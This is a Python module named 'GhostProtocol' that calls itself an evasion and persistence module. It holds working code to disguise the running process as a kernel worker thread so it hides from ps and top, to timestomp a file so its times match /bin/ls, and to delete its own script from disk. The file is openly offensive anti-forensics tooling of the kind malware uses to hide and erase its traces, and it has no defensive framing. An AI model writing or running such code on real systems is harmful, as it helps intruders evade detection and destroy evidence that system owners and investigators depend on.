import os
import sys
import time
import shutil
import ctypes
from rich.console import Console

console = Console()

class GhostProtocol:
    """
    Evasion & Persistence Module.
    """
    @staticmethod
    def cloak_process(name: str = "[kworker/u4:0]"):
        """
        Changes the process name to hide from ps.
        """
        console.print(f"[GHOST] 👻 Cloaking process as '{name}'...")
        try:
            # Linux method using prctl
            libc = ctypes.CDLL('libc.so.6')
            PR_SET_NAME = 15
            libc.prctl(PR_SET_NAME, name.encode())

            # Simple argv overwrite (Visual only for some tools)
            # In Python it's hard to overwrite argv[0] perfectly without third-party libs like setproctitle
            # But prctl works for 'top' and 'ps' on Linux
        except Exception as e:
            console.print(f"[GHOST] ⚠️ Cloaking failed: {e}")

    @staticmethod
    def timestomp(filepath: str, reference_path: str = "/bin/ls"):
        """
        Matches file timestamp to a system file.
        """
        console.print(f"[GHOST] 🕰️ Timestomping '{filepath}' to match '{reference_path}'...")
        try:
            st = os.stat(reference_path)
            os.utime(filepath, (st.st_atime, st.st_mtime))
        except Exception as e:
            console.print(f"[GHOST] ⚠️ Timestomp failed: {e}")

    @staticmethod
    def self_delete():
        """
        Deletes the running script from disk.
        """
        script_path = os.path.abspath(sys.argv[0])
        console.print(f"[GHOST] 🗑️ Self-Destructing source: {script_path}")
        try:
            os.remove(script_path)
        except Exception as e:
            console.print(f"[GHOST] ⚠️ Self-delete failed: {e}")
